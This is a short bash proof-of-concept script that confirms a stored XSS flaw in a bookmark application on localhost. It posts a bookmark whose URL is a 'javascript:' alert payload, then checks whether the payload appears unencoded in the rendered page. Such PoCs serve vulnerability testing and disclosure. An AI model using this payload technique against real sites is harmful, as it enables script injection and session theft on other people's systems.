#!/bin/bash

# POC for Stored XSS in Bookmark URL Field

# Clean start
rm -f /tmp/poc_cookies.txt

# Get initial session
curl -s -c /tmp/poc_cookies.txt http://localhost:5000/list > /dev/null

# Add bookmark with XSS payload in URL
curl -s -b /tmp/poc_cookies.txt -c /tmp/poc_cookies.txt -X POST http://localhost:5000/add \
  -d "name=XSSTest&url=javascript:alert('XSS')" > /dev/null

# Retrieve and verify XSS payload is present in href without encoding
RESULT=$(curl -s -b /tmp/poc_cookies.txt http://localhost:5000/list | grep -o 'href="javascript[^"]*"')

if [ -n "$RESULT" ]; then
  echo "[SUCCESS] Stored XSS vulnerability confirmed"
  echo "XSS payload found in rendered HTML:"
  echo "$RESULT"
  exit 0
else
  echo "[FAILED] XSS payload not found in response"
  exit 1
fi
